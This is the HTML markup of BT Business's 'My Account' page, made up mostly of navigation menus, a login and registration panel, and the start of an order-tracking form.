                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/mobile/phones/">Phones</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/mobile/sim-only/">SIM-only</a>
                    </div>
<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/mobile/tablets/">Tablets</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/mobile/mobile-broadband/">Mobile broadband</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/mobile/upgrades/">Upgrade mobile</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/mobile/5plus-employees/">5+ employees</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/products/voice/">Voice</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/voice/phone-lines/">Phone lines & Featureline</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/voice/isdn/">ISDN</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/voice/conferencing/">Conferencing</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/voice/numbers/">Business numbers</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/voice/payphone-services/">Payphone services</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/voice/phone-lines/calling-features/">Call diversion</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/products/business-phone-systems/">Phone systems</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/business-phone-systems/on-premises/">On-premises phone systems</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/business-phone-systems/voip/">VoIP phone systems</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/business-phone-systems/bt-cloudvoice-sip/">BT Cloud Voice SIP</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/business-phone-systems/one-phone/">BT One Phone</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/products/networking/">Networking</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/broadband-and-internet/bt-leased-line/">BTnet leased line</a>
                    </div>                    
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/networking/ethernet-vpn/">Ethernet VPN</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/networking/ethernet-point-to-point/">Ethernet Point-to-Point</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/networking/ip-connect/">IP Connect</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/networking/managed-wan/">Managed WAN</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/products/it-datacentre-services/">IT</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/cyber-security-sme/">SME security solutions</a>
                    </div>
                      <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/it-datacentre-services/bring-your-own-device/">Bring Your Own Device</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/it-datacentre-services/data-centre-solutions/">Cloud &amp; Data Centre Solutions</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/computing-apps/domain-registration/">Domain registration</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/computing-apps/business-apps/">Business Apps</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/products/computing-apps/">Computing & apps</a>
                    </div>
                </div>
            </div>
        </div>
        <div class="meganav solutionsNav corporate">
            <div class="meganav-container bt-content">
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">The future of work</div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights.html/?filters=%5Btopic%5DThe+future+is+now">The future is now</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/digital-transformation/">Digital transformation</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/remote-working/">Remote working</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/digital-skills/">Digital skills</a>
                    </div>
                    <div class="meganav-link-container">
						<a class="meganav-link" href="https://business.bt.com/solutions/tech-start-up-bursary/">Small business support scheme</a>
					</div>
					
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">Technology</div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/digital-transformation/ip-solutions/">IP technology</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/solutions/5g-bt-for-business/">5G</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/cyber-security/cyber-security-solutions-and-services/">Cyber security</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/5g/network-story/">Connectivity</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/insights/events/">Events</a>
                    </div>
                </div>
<!--                 <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            <a href="https://business.bt.com/solutions/public-sector/">Public sector solutions</a>
                        </div>
                    </div>
                </div> -->
            </div>
        </div>
        <div class="meganav supportNav corporate">
            <div class="meganav-container bt-content">
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Get help
                        </div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5055">Broadband &amp; internet</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5056">Phone line &amp; services</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5057">Office phones &amp; systems</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5059">Email, computing &amp; hosting</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5060">Mobile services</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5058">Billing</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Get in touch
                        </div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/help/contact-us-business/#buy">Contact BT Business</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/moving-premises">Moving premises</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/help/contact-us-business/#closeaccount">Close an account</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Tools
                        </div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link " href="https://business.bt.com/self-service/">Self-service with 'My account'</a>
					</div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Hub">My account</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Hub/?TYPE=33554433&REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=senroGWh8TGVp8dKtT7ws0RFCMev5xVSoaPazTTmmXjVQBUO1b0FeZgu7vZkZTtD&TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d1">Billing & payments</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/eserve/cust/loggedout/payByCard.html?ref=true">Pay bill</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Account/LoginRedirect.aspx?tabId=4">Report or track a fault</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Account/LoginRedirect.aspx?tabId=3">Track an order</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/service_status">Service status</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/comms/business-app/">Download the BT Business App</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Useful links
                        </div>
                    </div>

                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Hub/?TYPE=33554433&REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=$SM$EZgATSXs8vWyol20%2b2QIjkOqMYn%2fZjUFYXW3AScMIR51DY8xcbHSEefKPxnW7oPV&TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d2">Email</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Account/LoginRedirect.aspx?tabId=6">Manage your services</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btsportbusiness.com/">BT Sport for business</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/bt-local-business/">Find a local sales person</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.forums.bt.com">Business forum</a>
                    </div>
                   <div class="meganav-link-container">
                        <a class="meganav-link" href="https://www.bt.com/help/home/">BT for the home</a>
                    </div>
					<div class="meganav-link-container">
						<a class="meganav-link" href="https://www.bt.com/skillsfortomorrow/work-life" data-polaris-omtrack="Polaris:Nav:Performance results ">Free support for your business </a>
					</div>
                </div>
            </div>
        </div>
        <div class="meganav solutionsNav large-corporate">
            <div class="meganav-container bt-content">
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">The future of work</div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights.html/?filters=%5Btopic%5DThe+future+is+now">The future is now</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/digital-transformation/">Digital transformation</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/remote-working/">Remote working</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/digital-skills/">Digital skills</a>
                    </div>
                    <div class="meganav-link-container">
						<a class="meganav-link" href="https://business.bt.com/solutions/tech-start-up-bursary/">Small business support scheme</a>
					</div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">Technology</div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/digital-transformation/ip-solutions/">IP technology</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/solutions/5g-bt-for-business/">5G</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/cyber-security/cyber-security-solutions-and-services/">Cyber security</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/5g/network-story/">Connectivity</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/insights/events/">Events</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            <a href="https://business.bt.com/solutions/public-sector/">Public sector solutions</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="meganav supportNav large-corporate">
            <div class="meganav-container bt-content">
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Get help
                        </div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5055">Broadband &amp; internet</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5056">Phone line &amp; services</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5057">Office phones &amp; systems</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5059">Email, computing &amp; hosting</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5060">Mobile services</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5058">Billing</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Get in touch
                        </div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/help/contact-us-business/#buy">Contact BT Business</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/moving-premises">Moving premises</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/help/contact-us-business/#closeaccount">Close an account</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Tools
                        </div>
                    </div>
                     <div class="meganav-link-container">
                        <a class="meganav-link " href="https://business.bt.com/self-service/">Self-service with 'My account'</a>
				  </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Hub">My account</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Hub/?TYPE=33554433&REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=senroGWh8TGVp8dKtT7ws0RFCMev5xVSoaPazTTmmXjVQBUO1b0FeZgu7vZkZTtD&TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d1">Billing & payments</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/eserve/cust/loggedout/payByCard.html?ref=true">Pay bill</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Account/LoginRedirect.aspx?tabId=4">Report or track a fault</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Account/LoginRedirect.aspx?tabId=3">Track an order</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/service_status">Service status</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/comms/business-app/">Download the BT Business App</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Useful links
                        </div>
                    </div>

                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Hub/?TYPE=33554433&REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=$SM$EZgATSXs8vWyol20%2b2QIjkOqMYn%2fZjUFYXW3AScMIR51DY8xcbHSEefKPxnW7oPV&TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d2">Email</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Account/LoginRedirect.aspx?tabId=6">Manage your services</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btsportbusiness.com/">BT Sport for business</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/bt-local-business/">Find a local sales person</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.forums.bt.com">Business forum</a>
                    </div>
                   <div class="meganav-link-container">
                        <a class="meganav-link" href="https://www.bt.com/help/home/">BT for the home</a>
                    </div>
					<div class="meganav-link-container">
						<a class="meganav-link" href="https://business.bt.com/help/how-are-we-doing/" data-polaris-omtrack="Polaris:Nav:Performance results ">Performance results </a>
					</div>
					<div class="meganav-link-container">
						<a class="meganav-link" href="https://www.bt.com/skillsfortomorrow/work-life" data-polaris-omtrack="Polaris:Nav:Free support for your business">Free support for your business </a>
					</div>
                </div>
            </div>
        </div>
        <div class="meganav solutionsNav public-sector">
            <div class="meganav-container bt-content">
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">The future of work</div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights.html/?filters=%5Btopic%5DThe+future+is+now">The future is now</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/digital-transformation/">Digital transformation</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/remote-working/">Remote working</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/digital-skills/">Digital skills</a>
                    </div>
                    <div class="meganav-link-container">
						<a class="meganav-link" href="https://business.bt.com/solutions/tech-start-up-bursary/">Small business support scheme</a>
					</div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">Technology</div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/digital-transformation/ip-solutions/">IP technology</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/solutions/5g-bt-for-business/">5G</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/cyber-security/cyber-security-solutions-and-services/">Cyber security</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/insights/5g/network-story/">Connectivity</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <a class="meganav-link heading" href="https://business.bt.com/insights/events/">Events</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            <a href="https://business.bt.com/solutions/public-sector/">Public sector solutions</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="meganav supportNav public-sector">
            <div class="meganav-container bt-content">
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Get help
                        </div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5055">Broadband &amp; internet</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5056">Phone line &amp; services</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5057">Office phones &amp; systems</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5059">Email, computing &amp; hosting</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5060">Mobile services</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/categories/detail/c/5058">Billing</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Get in touch
                        </div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/help/contact-us-business/#buy">Contact BT Business</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/moving-premises">Moving premises</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/help/contact-us-business/#closeaccount">Close an account</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Tools
                        </div>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link " href="https://business.bt.com/self-service/">Self-service with 'My account'</a>
					</div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Hub">My account</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Hub/?TYPE=33554433&REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=senroGWh8TGVp8dKtT7ws0RFCMev5xVSoaPazTTmmXjVQBUO1b0FeZgu7vZkZTtD&TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d1">Billing & payments</a>
                    </div>
					<div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/eserve/cust/loggedout/payByCard.html?ref=true">Pay bill</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Account/LoginRedirect.aspx?tabId=4">Report or track a fault</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Account/LoginRedirect.aspx?tabId=3">Track an order</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btbusiness.custhelp.com/app/service_status">Service status</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/comms/business-app/">Download the BT Business App</a>
                    </div>
                </div>
                <div class="meganav-column">
                    <div class="meganav-heading">
                        <div class="meganav-link heading-no-link">
                            Useful links
                        </div>
                    </div>

                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Hub/?TYPE=33554433&REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=$SM$EZgATSXs8vWyol20%2b2QIjkOqMYn%2fZjUFYXW3AScMIR51DY8xcbHSEefKPxnW7oPV&TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d2">Email</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://secure.business.bt.com/Account/LoginRedirect.aspx?tabId=6">Manage your services</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://btsportbusiness.com/">BT Sport for business</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.bt.com/bt-local-business/">Find a local sales person</a>
                    </div>
                    <div class="meganav-link-container">
                        <a class="meganav-link" href="https://business.forums.bt.com">Business forum</a>
                    </div>
                   <div class="meganav-link-container">
                        <a class="meganav-link" href="https://www.bt.com/help/home/">BT for the home</a>
                    </div>
					<div class="meganav-link-container">
						<a class="meganav-link" href="https://business.bt.com/help/how-are-we-doing/" data-polaris-omtrack="Polaris:Nav:Performance results ">Performance results </a>
					</div>
					<div class="meganav-link-container">
						<a class="meganav-link" href="https://www.bt.com/skillsfortomorrow/work-life" data-polaris-omtrack="Polaris:Nav:Free support for your business">Free support for your business </a>
					</div>
                </div>
            </div>
        </div>
    </div>
</header>

<link rel="stylesheet" href="https://btbsecure.business.bt.com/commonContent/V2/css/btb.global.nav.css?v=2.0" type="text/css">
<script src="https://btbsecure.business.bt.com/commonContent/V2/js/btb.global.nav.jquery.js?v=2.0"></script>
<script src="https://btbsecure.business.bt.com/commonContent/V2/js/btb.global.nav.js?v=2.0"></script>
<script src="https://btbsecure.business.bt.com/CommonContent/V2/js/btb.polaris-main-r.js?v=2.0"></script>
            <!--End of getting common content -->
        </div>
    </div>
</section>

    <div id="body">
    </div>
    <div>
        

<script type="text/javascript">
    $.get('/js/saas_logout.js', "rand=" + new Date().getTime());
</script>
<div ng-app="HubApp" data-omload='{"i":34, "e":"", "l":"LOGIN"}'>
    <div data-ajax-loader class="" ng-show="waitingState.show">
        <div class="">
        </div>
    </div>
    

<!-- wrapper for the section -->
<hr class="hr-header">
<section class="push--ends" ng-controller="AccountController" ng-init="InitData('/Account/LoginRedirect.aspx?tabid=0','','SITEMINDER','login.php','','','','','','')">
    <!-- wrapper for the component -->
    <form name="Login" data-abide method="post">
        <div class="content-wrap hub-inner ">
            <div class="row">
                <div class="small-9 medium-centered small-centered columns medium-6">
                    <h1>My Account</h1>
                </div>
            </div>
            <div class="row customers" data-equalizer="">
                <div class="columns small-12 medium-4  medium-offset-2">
                    <div class="panel primary-feature " data-equalizer-watch="" style="height: 316px;">
                        <h2 style="color: white;">
                            Log in
                        </h2>
                        <div class="row">
                            <div class="columns small-12 medium-12">
                                <label>
                                    Email or username
                                    <input type="text" name="USER" id="USER" ng-model="userData.UserID" placeholder="email or username"
                                           required />
                                    <small class='error'>Enter your email address or username</small>
                                </label>
                            </div>
                            <div class="columns small-12 medium-12">
                                <label>
                                    Password
                                    <input type="password" name="PASSWORD" id="PASSWORD" ng-model="userData.Password"
                                           placeholder="password" required>
                                    <small class='error'>Enter your password</small>
                                </label>
                            </div>
                            <div class="columns small-12 medium-12">
                                <div data-omtrack="link:Sign">
                                    <input id="btnAuthenticateUser" value="Log in" type="submit" name="Log in" ng-click="AuthenticateUser($event,'siteminderForm');"
                                           class="button button round" />
                                </div>
                                                                <p>
                                    <a class="link" data-omclick='{"m":"Forgotten login details"}' id="acrForgottenLoginDetails"
                                       href="/ForgotUsernameandPassword">Forgotten login details?</a>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="columns small-12 medium-4 end">
                    <div class="panel secondary-feature" data-equalizer-watch="" style="height: 316px;">
                        <h2>
                            Register
                        </h2>
                        <p>
                            Register for  My account for online billing, faults, and order tracking.
                        </p>
                        <p>
                            It's easy and only takes a couple of minutes.
                        </p>
                        <a href="/Registration.aspx" data-omclick='{"m":"Register"}' class="button button round">
                            Register
                        </a>
                        <p><a href="https://business.bt.com/comms/business-app/"><img src="https://secure.business.bt.com/Content/Common/assets/images/promo-My-Account-app-V2.png" alt="Manage your account on the go. Download the BT Business app."></a></p>
                    </div>
                </div>
            </div>
        </div>
    </form>
</section>
<!-- C030 Notifications  -->
<!-- wrapper for the section -->
<section class="C030-further-info ">
    <!-- wrapper for the component -->
    <div class="content-wrap hub-tasks ">
        <div class="row ">
            <div class="small-5 medium-centered small-centered columns medium-3">
                <h3>
                    Popular shortcuts
                </h3>
            </div>
            <div class="columns ">
                <ul class="small-block-grid-1 C030-further-info-item">
                    <li>
                        <!-- Row 1 -->





<dl class="accordion" id="ot-section" data-accordion="C030-further-info-item" ng-expand-scroll-here-when="tabid == 3">
    <dd id="icon-arrow-change" class="accordion-navigation" >
        <a data-omclick='{"m":"Popular shortcuts - Track an order - Expand"}' href="#further-info-four-" class="notifications-section-heading">
            Track an order <span class="icon-wrapper"><i class="icon-arrow-down"></i></span>
        </a>
        <div id="further-info-four-" class="content notifications-rows" ng-init="initialize(true,true)" ng-controller="OrderTrackerController">
            <form id="orderTracker" name="orderTracker_form" novalidate method="POST">
                <div class="row">
                    <div class="medium-4 columns">
                        <label>
                            Order number
                            <span class="info-icon" ng-click="showOrHideTooltip('code-input-tooltip')">
                                i
                            </span>
                            <input id="code-input" type="text" spellcheck="false" name="trackReferenceBox" data-ng-model="orderRef"
                                   autocomplete="off" alter-tooltip data-options="align:top" aria-expanded="false" ng-keyup="onKeyUpEvent()"
                                   ng-blur="onBlur($event)" ng-keypress="onKeyPressEvent($event)" ng-paste="onOrderRefChange()" ng-cut="onOrderRefChange()"
                                   maxlength="20" />

                            <!-- Tooltip start -->
                            <div id="code-input-tooltip" class="tooltip-service" style="display: none">
                                <div id="trackReferenceGeneric">
                                    <span class="tooltip-close-btn" ng-click="hideTooltip('code-input-tooltip')"></span>
                                    <span class="tooltip-header">
                                        Your order number will look like one of these.
                                    </span>
                                    <ul class="no-bullet accordion">
                                        <li data-reference="VOL">
                                            <span class="pattern">
                                                <p data-pattern="VOL012-12345678901" class="rule">
                                                    VOL012-12345678901
                                                </p>
                                                <p class="description">
                                                    Starts with VOL followed by three and eleven numbers
                                                </p>
                                                <p class="error-message" style="display: none;">
                                                    Oops. This is a generic error message to tell your something is wrong
                                                </p>
                                            </span>
                                        </li>
